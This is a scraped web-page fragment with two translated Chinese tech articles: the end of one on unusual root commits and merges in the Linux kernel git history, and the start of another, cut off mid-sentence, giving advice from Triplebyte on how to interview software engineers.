data-line=\"crayon-5bab6711bdcdd485294598-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcdd485294598-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcdd485294598-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcdd485294598-1\"><span class=\"crayon-cn\">566cf87</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">current </span><span class=\"crayon-v\">HEAD</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcdd485294598-2\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcdd485294598-3\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">a101ad9 </span><span class=\"crayon-e\">Share </span><span class=\"crayon-e\">upstreaming </span><span class=\"crayon-v\">patches</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcdd485294598-4\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcdd485294598-5\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">cd26f1b </span><span class=\"crayon-v\">greybus</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Initial </span><span class=\"crayon-v\">commit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcdd485294598-6\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcdd485294598-7\"><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be0e5c0 </span><span class=\"crayon-v\">Btrfs</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Initial </span><span class=\"crayon-v\">checkin</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">basic </span><span class=\"crayon-e\">working </span><span class=\"crayon-e\">tree </span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcdd485294598-8\"><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcdd485294598-9\"><span class=\"crayon-o\">*</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1da177e</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Linux</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2.6.12</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">rc2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>这四个提交中的每一个都是离当前内核版本库 HEAD 节点很遥远的祖先节点，并且都没有父节点。从 git 的角度来看，内核历史“开始”了不同的四次，所有的这些提交最终都被合并在一起。</p>\n<p>这四个提交中的第一个（在我们输出的底部）是2005年的初始化提交，也就是我们通常认为的初始化提交。第二个是文件系统 btrfs 的开发，它是独立仓库完成的。第三个是 Greybus,同样也是独立仓库完成的，我们之前已经说过。</p>\n<p>第四个初始化提交，a101ad9，很奇怪，正如下面看到的:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdce0533015617\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git show --oneline --stat a101ad9\r\na101ad9 Share upstreaming patches\r\n README.md | 2 ++\r\n 1 file changed, 2 insertions(+)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdce0533015617-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdce0533015617-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdce0533015617-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdce0533015617-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdce0533015617-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">show</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">oneline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">stat </span><span class=\"crayon-e\">a101ad9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdce0533015617-2\"><span class=\"crayon-e\">a101ad9 </span><span class=\"crayon-e\">Share </span><span class=\"crayon-e\">upstreaming </span><span class=\"crayon-e\">patches</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdce0533015617-3\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">README</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">md</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">++</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdce0533015617-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">file </span><span class=\"crayon-v\">changed</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">insertions</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">+</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0306 seconds] -->\r\n<p>它刚创建了一个 README.md 文件。但随后，它就立即被合并到正常的内核历史的提交 e5451c8 中了！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdce3407269433\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git show e5451c8\r\ncommit e5451c8f8330e03ad3cfa16048b4daf961af434f\r\nMerge: a101ad9 3cf42ef\r\nAuthor: Laxman Dewangan &lt;ldewangan@nvidia.com&gt;\r\nDate:   Tue Feb 23 19:37:08 2016 +0530</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdce3407269433-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdce3407269433-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdce3407269433-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdce3407269433-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdce3407269433-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdce3407269433-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-e\">show </span><span class=\"crayon-e\">e5451c8</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdce3407269433-2\"><span class=\"crayon-e\">commit </span><span class=\"crayon-e\">e5451c8f8330e03ad3cfa16048b4daf961af434f</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdce3407269433-3\"><span class=\"crayon-v\">Merge</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a101ad9</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3cf42ef</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdce3407269433-4\"><span class=\"crayon-v\">Author</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Laxman </span><span class=\"crayon-v\">Dewangan</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">ldewangan</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">nvidia</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdce3407269433-5\"><span class=\"crayon-v\">Date</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Tue </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">37</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">08</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2016</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">0530</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>为什么有人会创建一个只包含两行文本的 README 文件的初始化提交，然后立即合并到主线的历史记录中呢？我想不出任何理由，所以我怀疑这是一个意外！但它没有造成任何危害；它只是很奇怪。（更新：<a href=\"http://lkml.iu.edu/hypermail/linux/kernel/1603.2/01926.html\" target=\"_blank\">这是个意外</a>，Linus用他一贯的方式回应了。）</p>\n<p>顺便提一句，这也是历史记录中差异数量排第二的提交，仅仅因为它是一个不相关提交的合并，就像我们仔细研究过的 Greybus 的合并一样。</p>\n<p>现在你知道了：Linux 内核的 git 历史记录一些最奇怪的事情。一共有 1,549 个章鱼式合并，其中有一个是拥有 66 个父节点的提交。差异最多的合并有 22,445,760 行差异，尽管它有点技术性因为它和仓库的其他部分没有公共的历史记录。内核拥有四个独立的初始化提交，其中一个是失误导致的。尽管上面的这些都不会出现在绝大多数的 git 仓库中，但是所有的这些功能都是在 git 的设计范围之内的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114256\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114256votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114256\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3057027161\">可乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/q3057027161\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/19D693E8F32E174301CF7B140001AB0F/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            本科在读，对python,linux,安全很感兴趣，希望能够阅读国外最新的技术新闻，也希望能够翻译一些文章帮助到别人        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/q3057027161\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/q3057027161/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/q3057027161/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://kele1997.xyz\"><i class=\"fa fa-link\"></i></a> <a title=\"QQ：2363618563\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：a2363618563\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a> <a title=\"GitHub主页\" target=\"_blank\" href=\"https://github.com/kele1997\"><i class=\"fa fa-github\"></i></a> <a title=\"Twitter主页\" target=\"_blank\" href=\"https://twitter.com/cocakele1997\"><i class=\"fa fa-twitter\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/2b02c513e245b35efef88916887d9097b0e8d4ee.jpg"}
{"title": "2 年面试 900 多位工程师后，我总结了这些经验", "url": "http://blog.jobbole.com/114168/", "create_date": "2018/08/08", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1fstj3g5udqj20gh0b4wi2.jpg"], "url_object_id": "f58dc554cabbfc82a982e95b3dfade79", "praise_nums": 1, "fav_nums": 4, "comment_nums": 0, "tags": "职场,面试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://blog.triplebyte.com/how-to-interview-engineers\">Ammon Bartram</a>。欢迎加入<a target=\"_blank\" href=\"https://github.com/jobbole/translation-project\">翻译组</a>。</div><p>我们在 Triplebyte上进行过很多场面试，实际上，我在过去两年内面试的工程师已经达到 900 余人，这到底算不算卓有成效还真是不好说！（有时我会冒着一身冷汗从梦中惊醒，对这一点充满质疑）。但是不管怎样，我们目标是改进应聘工程师的方式。为此，我们面试时不看求职者的背景，不在乎他们的文凭或简历，只关注他们的编程能力。一个工程师通过了我们这一关后，能直接到我们的合作方公司（包括 Apple、Facebook、Dropbox 和 Stripe）进行终面。我们面试时不知道应聘者的背景，这种情况下看他们是如何在众多顶尖科技公司前大展身手的，我觉得可以给我们的面试提供一些最佳的可用资料。</p>\n<blockquote><p>伯乐在线补注：Triplebyte 是国外一家专注工程师招聘的网站。</p></blockquote>\n<p>在这篇博客中，我要讲讲迄今为止我从这些资料中所学到的东西。技术面试在很多方面都是漏洞百出的，这一点口头说说很简单（而且许多博客都只是这样说说而已！），难的是想出实际的解决方法。我写这篇博客就是为了迎接这个挑战，并为招聘经理和 CTO 提供一些具体的建议。面试这件事有难度，但我想只要遵循一套缜密的流程，那么许多问题都会迎刃而解。</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fstj3g5udqj20gh0b4wi2.jpg\"></p>\n<h2>现状</h2>\n<p>大多数的面试过程主要包括两步：</p>\n<ol>\n<li>简历筛选</li>\n<li>面试</li>\n</ol>\n<p>对求职者的筛选就是为了提前淘汰一些求职申请者，节省面试工作的时间。通常筛选过程包括：招聘官大体浏览求职申请者的简历（大概用时 10 秒以内），然后进行 30~60 分钟的电话面试。我们的合作方公司中有 18% 的公司为了考验求职者，也会出编程题让他们回家完成（要么代替电话面试，要么作为电话面试以外的附加题）。有意思的是，绝大多数的求职申请者都是在筛选这一关被拒的。真是这样，我们合作的所有公司中，单纯因为简历就被筛掉的求职申请者已超过了 50%，另外有 30% 因为电话面试/带回家的项目完成不佳而被刷掉。筛选也是聘用过程最变化无常捉摸不定的环节，应聘者太多，导致招聘人员应接不暇，只能做出仓促的决定，因此这时候求职者的文凭资历和专业匹配度就派上了用场。</p>\n<p>终面几乎普遍都是由一系列 45 分钟到 1 小时的会谈组成，每次会谈的面试官都不一样，会谈主要考技术题（每个公司外加一两个针对文化适应和软技能的问题）。招聘经理和每个面试官会在求职申请者离开后，在决策会议上做出他们最终录用/淘汰的决定。在至少有一人力挺，且没人强烈反对的情况下，一个求职申请者才可能被录用。</p>\n<p>终面除了常见的形式之外，还有各种千变万化的类型。</p>\n<ul>\n<li>我们合作的公司中，39% 会使用白板面试。</li>\n<li>有 52% 允许求职者使用他们自己的电脑作答（剩下的 9% 视情况而定）。</li>\n<li>有 55% 让面试官随意提问（剩下的 45% 采用一套标准面试题）。</li>\n<li>有 40% 要考察求职者的 CS 学术技能后，才能确定去或留。</li>\n<li>有 15% 不喜欢 CS 学术技能（而且觉得探讨计算机科学只能暴露该求职者生产力低）。</li>\n<li>有 80% 允许求职申请者在面试时使用任何编程语言（剩下的20%要求他们使用特定编程语言）。</li>\n<li>有 5% 会在面试过程中直白地评价求职者编程语言的细节。</li>\n</ul>\n<p><img src=\"https://phaven-prod.s3.amazonaws.com/files/image_part/asset/1897004/GEXLppDgnswH2dd_djp4sWvsnQA/medium_light_v2.png\"></p>\n<p>放眼所有与我们合作的公司，终面后决定录用的占 22%。（这个数据是通过询问公司内部招聘渠道获得的。Triplebyte 上的求职者通过公司面试被录用的成功率为 53%。）其中大概 65% 会接受 offer（达成雇佣关系）。一年后，公司对录用了 30%、开除率 5% 的情况非常满意。</p>\n<h2>漏招 VS 误招</h2>\n<p>所以，现在的面试存在什么问题呢？毕竟开除员工的频率并非是不可控的。为了更清楚地看待这个问题，我们需要考虑导致面试失败的两种情况：</p>\n<ol>\n<li>面试了一个不合格的工程师，却将其聘用，过后只好开除（误招）；</li>\n<li>面试了一个工作能力很强的工程师，却认为他不合格，选择不予聘用（漏招）。</li>\n</ol>\n<p>误招一眼就能看出来，公司会（在薪水、管理成本和全团队的精神面貌上）付出很大代价，会把一个团队搞得萎靡不振。而与之对比，漏招的损失却看不出来。虽然以上任意一种情况都很有问题，但由于这误招和漏招引发的后果乍一看很不平衡，所以公司的面试很大程度上倾向于不予聘用。</p>\n<p>面试中存在的干扰会使公司不予聘用的倾向更加严重。在一小时内评估一个人的编程能力本来就是很难的，各种条件经历的匹配、某些直觉感受和以上谈到的公司的复杂喜好等因素掺杂进来，使得你在面试别人时被各种干扰团团围困。</p>\n<p>为了在受干扰环境下把误招率控制在一个较低的水平，公司在招聘时越来越偏向于不予聘用。这样会错过优秀的工程师，会使文凭的重要程度高过实力，也会由于反复无常，使参与其中的人（面试官和求职者等）感到失望。<strong><b>假使你公司中的每个员工为了争取他们当前的职位都得重新参加面试，那么通过率能有多大呢？</b></strong>这个问题很骇人，几乎可以确定他们不可能都被录取。求职申请人会因为本有能力为公司好好效力却没被录用而神伤，公司也会因为找不到可用之才而遭受损失。</p>\n<p>要澄清一点，我不是说公司应该降低面试的门槛，相反，面试招人正因为会有拒绝才存在的意义！我更不是说公司对误招的担忧远大过漏招是不对的，招错人要付出高昂代价，<strong><b>我想说的是：各种干扰信号的影响外加之对于</b></strong><strong><b>误招</b></strong><strong><b>的防范，会导致</b></strong><strong><b>面试的漏招率大大攀升，导致人才流失。为解决这一问题，就需要</b></strong><strong><b>改善面试环境</b></strong><strong><b>。</b></strong></p>\n<h2>减少面试中干扰因素的具体方法</h2>\n<h3>1.决定你想要招聘哪方面的技术人才</h3>\n<p>一个程序员不可能因为具备了哪一套技能就能被定义为优秀的程序员了，相反，世上的编程技能多得犹如汪洋大海，没有工程师能在所有的领域都游刃有余。实际上，我们在 Triplebyte上碰到过一些杰出、成功的软件工程师，他们在几个毫不相关的领域都颇有建树。面试成功的第一步就是决定你想要招聘哪方面的技术人才。我建议你问自己以下几个问题：</p>\n<ul>\n<li>你想要的程序员是效率高，但写的代码不完善需反复修改的，还是一丝不苟、思维严密的？</li>\n<li>你想要的程序员是热衷于解决技术难题的还是构建产品的？</li>\n<li>你想要已经具备某种特定技能的人才还是在工作中有很强的学习能力的？</li>\n<li>计算机科学学术/数学/算法方面的能力是至关重要的还是无关紧要的？</li>\n<li>了解并发/ C内存模型/ HTTP 很重要吗？</li>\n</ul>\n<p>这些问题没有正确答案，我们合作的成功企业对以上每个问题选任一方的都有。<strong><b>但关键是要根据自己的需求</b></strong><strong><b>有针对性地做出选择</b></strong><strong><b>，应该避免</b></strong><strong><b>随便向求职者抛个</b></strong><strong><b>面试</b></strong><strong><b>问题了事（或者让</b></strong><strong><b>每个</b></strong><strong><b>面试官决定）。</b></strong>这样的话，公司的工程文化就会有一定倾向：淘汰掉越来越多虽然有一技之长但是对公司并没太大用处的、以及不具备公司所需技能（却具备其他重要技能）的工程师。</p>\n<h3>2.问尽可能和实际工作相贴切的问题</h3>\n<p>专业程序员的任务是花数周数月的时间解决大型的、错杂延展的问题，但是面试官并没有数周数月的时间去评估求职申请者的能力，通常每个面试官只有一个小时去考核，所以他们会转而去考察求职申请者在强压下迅速解决小问题的能力。这是两种不同的能力测试。二者有一定的相关性（面试并不完全随机），但并不是完全相关。制定面试问题的一大目标就是减少面试考察和实际工作的差异。</p>\n<p>方法是在面试时向申请某一职位的求职者（或者为了衡量某一技能）问尽可能相似的问题。比如说，如果你关心后端编程，那就让求职申请者建一个简单的 API 端点，再添加特性，几乎可以肯定，这比让他们解决一个 BFS 词链问题有意义得多；如果你关心算法能力，那让求职者在问题中运用算法（比方说，建一个简单的搜索索引，可能使用 BST 和 hashmap，实现提升删除操作的性能），几乎可以肯定，这比让他们确定一点是否包含在一个凹多边形中有意义得多；让求职者在实际编程过程中去尝试调试程序，几乎可以肯定，这比让他们去解决一个白板上的小问题有意义得多。</p>\n<p>即便如此，面试中要不要让程序员在白板上作答还是有争议的。作为面试官，我不在乎工程师是否记住了 Python 中的 itertools 模块，我在乎的是他们是否想通了如何用 itertools 模块去解决问题。通过让他们在白板上答题，他们便可以不用遵循严格的编程语法，而完全专注于逻辑问题。但最终白板答题的提议还是行不通，因为白板上答案的形式五花八门，没有那么多的评判标准可以对它们一一进行对错评判。所以让求职申请者们回归到电脑上编程，同时告诉他们不必真正去运行代码（或者采用更好的方法，进行开卷面试，让他们在 Google 上查询任何所需的信息），那么考察他们的目的就已经达到了。</p>\n<p>面试问题应该对日后工作有所反应，对此要特别警告，面试不依赖于外部因素是至关重要的。比如说，让一个求职者用 Ruby 编写一个简单的爬虫看似是个很好的实际问题，但是，如果求职者为此需要先安装 Nokogiri （一个安装起来非常费劲的 Ruby 解析库），结果花了 30 分钟绞尽脑汁应对本地扩展，那么这次面试就糟透了，不仅浪费了时间，而且也让求职者一下子压力爆棚。</p>\n<h3>3.问不会提前泄露的多面性问题</h3>\n<p>另一个针对面试提问的经验之谈是避免提问有可能会“泄露”出去的问题。比如说，有些问题的某些信息可能求职申请者提前能从 Glassdoor 上读到，所以他们回答起来就会轻而易举，因此这类问题就要避免提问，否则求职者明显就不用动脑筋了，也抹杀了需要考验他们直觉洞察力的地方。而且除此之外，也意味着面试的问题应该由一系列相互承载的部分组成，而不是一个单一的中心。换种有用的方式去想，问问你自己，能不能在面试时帮助一个陷于困境的求职者，并让他在面试结束还能给大家留下一个不错的印象。对答案唯一的问题，如果你给求职申请者提供了明显的帮助，那么他就直接面临淘汰；而对于多面性的问题，你帮了求职申请者一步，那么他还有机会在其余部分大展身手，完美表现。</p>\n<blockquote><p>伯乐在线补注：Glassdoor 是国外一家做企业点评和职位搜索网站。</p></blockquote>\n<p>这一点很重要，不仅因为你的问题会在  Glassdoor 上泄露出来，而且（更重要的）是因为多面性的问题可以减少干扰。优秀的求职者会背负压力，陷于困境，面试时很重要的一点就是对他们提供帮助，从而让其好好发挥。考查他们解决任意小编程逻辑问题的能力时，他们最近一段时间是不是看到过、或可能只是恰巧碰到过类似的问题，会对考查造成明显干扰，而多面性的问题则可以消除一些干扰，也让求职者们有机会看到他们的努力像滚雪球一样越积越大。给他们提供一步的帮助，往往能帮他们解决紧接着的下一步，这给实际工作提供了重要动力，在面试时把握这一点就可以减少干扰。</p>\n<p>举例来说，让一个求职者在终端实现“四子连珠”游戏（一系列多个步骤），可能要比让他去旋转矩阵（一个单独步骤，外加之一些小操作）要好得多；让求职者实现 k 